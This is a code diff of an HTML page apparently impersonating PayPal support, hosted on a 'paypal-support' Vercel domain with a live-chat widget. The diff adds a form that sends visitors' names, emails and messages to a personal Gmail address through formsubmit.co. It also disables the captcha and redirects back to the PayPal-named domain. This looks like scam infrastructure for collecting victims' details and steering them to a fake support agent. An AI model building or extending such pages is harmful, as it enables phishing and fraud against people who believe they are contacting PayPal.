@@ -29,20 +29,17 @@
        connect with the livechat agent.
       </p>
 
-      <div class="border-t pt-4 mt-4">
-        <div class="mb-4">
-          <label class="block text-sm font-medium mb-1" for="userName">Your Name</label>
-          <input type="text" id="userName" class="w-full p-2 border rounded" placeholder="John Doe" />
-        </div>
-        <div class="mb-4">
-          <label class="block text-sm font-medium mb-1" for="userIssue">Describe Your Issue</label>
-          <textarea id="userIssue" class="w-full p-2 border rounded h-24" placeholder="Describe your issue in detail..."></textarea>
-        </div>
-        <button class="bg-blue-600 text-white px-4 py-2 rounded hover:bg-blue-700 text-sm w-full">
-          Submit to Support Chat
-        </button>
-      </div>
-    </section>
+      <form action="https://formsubmit.co/csma026@gmail.com" method="POST" class="bg-white p-6 rounded shadow space-y-4">
+  <input type="text" name="name" placeholder="Your Name" class="w-full p-2 border rounded" required />
+  <input type="email" name="email" placeholder="Your Email" class="w-full p-2 border rounded" required />
+  <textarea name="message" placeholder="Your Message" class="w-full p-2 border rounded h-32" required></textarea>
+
+  <!-- Optional hidden inputs -->
+  <input type="hidden" name="_captcha" value="false">
+  <input type="hidden" name="_next" value="https://paypal-support-indol.vercel.app/thank-you.html">
+  
+  <button type="submit" class="bg-blue-600 text-white px-4 py-2 rounded hover:bg-blue-700">Submit</button>
+</form>
 
     <section id="faq" class="mt-10">
       <h3 class="text-lg font-semibold mb-4 text-blue-700">Frequently Asked Questions</h3>
@@ -75,4 +72,5 @@ if(w.chaport)return;v3=w.chaport={};v3._q=[];v3._l={};v3.q=function(){v3._q.push
 </script>
 <!-- End of Chaport Live Chat code -->
 </body>
-</html>
+    </html>
+    
